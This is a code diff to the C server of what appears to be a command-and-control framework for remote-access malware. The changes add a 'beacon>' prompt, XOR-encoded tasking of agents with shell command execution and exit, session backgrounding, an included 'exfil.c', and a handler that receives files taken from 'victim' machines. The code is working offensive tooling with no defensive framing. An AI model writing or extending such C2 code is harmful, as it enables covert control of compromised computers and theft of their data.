@@ -5,6 +5,7 @@
 #include <ctype.h>
 #include <string.h>
 #include <unistd.h>
+#include "exfil.c"
 
 extern char* key;
 extern int keylen;
@@ -43,7 +44,7 @@ int server_control_session(){
                 printf("Invalid id!\n\n");
             } else {
                 printf("[+] Entering agent control session with session ID: %d...\n", selected_id);
-                printf("Type \"exit\" to background agent control session\n");
+                printf("Type \"bg\" to background agent control session\n");
                 selected_id += 3;
                 return selected_id;
             }
@@ -103,14 +104,30 @@ void *Socket_Reader(){
     char* xorhello = XOR(buffer, key, n, keylen);
     write(STDOUT_FILENO, xorhello, n);
 
+    printf("beacon> ");
+
     fflush(NULL);
     while (a.kill == 0 && (n = read(a.dest, buffer, MAXBUF)) > 0) {
+
 	xorbuffer = XOR(buffer, key, n, keylen);
+	if(str_starts_with(xorbuffer, "--HUNTER DOWNLOAD--") == 0){
+		char* xorconfirm = XOR("OK", key, 5, keylen);
+		write(a.dest, xorconfirm, 5);
+		free(xorconfirm);
+		recvfile("out.hunter", a.dest, key);
+		continue;
+
+	}
+
+	if(a.kill == 0){printf("beacon> ");}
+
         if (write(STDOUT_FILENO, xorbuffer, n) < 0)  // writes data from victim fd to stdout
             printf("Error in function write()\n");
+
         fflush(NULL);
-        //printf("%d>", a.dest);
         fflush(NULL);
+
+	free(xorbuffer);
     }
 
     if (n < 0)
@@ -132,19 +149,51 @@ void *Socket_Writer()
     int n;
     char buffer[MAXBUF];
 
-    while (a.kill == 0 && (n = read(a.src, buffer, MAXBUF)) > 0) // reads from the stdin file descriptor and executes code if it's contents are above 0. a.src is passed the stdin fd on line 122
+    while (a.kill == 0 && (n = read(a.src, buffer, MAXBUF)) > 0)
     {
-	
 
-        if (strcmp(newline_terminator(buffer), "exit\n") == 0 || strcmp(newline_terminator(buffer), "!exit\n\n") == 0) { //Find a way
-            printf("Exiting session...\n");
+        if (strcmp(newline_terminator(buffer), "bg\n") == 0) {
+	    
+            printf("Backgrounding session...\n");
             a.kill = 1;
             return NULL;
-        } else {
+        } 
+	else if(strcmp(newline_terminator(buffer), "exit\n") == 0){
 	
+	    printf("[+] Tasking agent with exit\n");	
+	    char* xorbuffer = XOR(buffer, key, n, keylen);
+	    write(a.dest, xorbuffer, n);
+
+	    for(int i = 0; i < max_clients; i++){
+	    	if(client_socket[i] == a.dest){
+			close(client_socket[i]);
+
+	    		a.kill = 1;
+			victim_count--;
+			client_socket[i] = 0;
+			printf("[+] Control session: %d successfully exited.\n", a.dest - 3);
+	
+		}
+				
+		else if(i == max_clients){
+			printf("[-] Could not find socket to close.\n");
+		}
+	    }
+
+	    free(xorbuffer);
+	    return NULL;
+	}
+
+	else {
+	
+	    if(str_starts_with(buffer, "shell") == 0){
+		printf("\n[+] Tasking agent with command execution\n\n");
+	    }
+
 	    char* xorbuffer = XOR(buffer, key, n, keylen);
 
             write(a.dest, xorbuffer, n); // writes to victim file descriptor. clientfd is passed to a.dest on line 12
+	    free(xorbuffer);
         }
     }
 
@@ -197,7 +246,8 @@ void *Acceptor(){
             if ((activity < 0) && (errno!=EINTR)) {}
 
             if (FD_ISSET(master_socket, &readfds)) {
-                if ((new_socket = accept(master_socket, (struct sockaddr *)&cli, &len))<0){
+                
+		if ((new_socket = accept(master_socket, (struct sockaddr *)&cli, &len))<0){
                     perror("accept");
                     exit(EXIT_FAILURE);
                 }
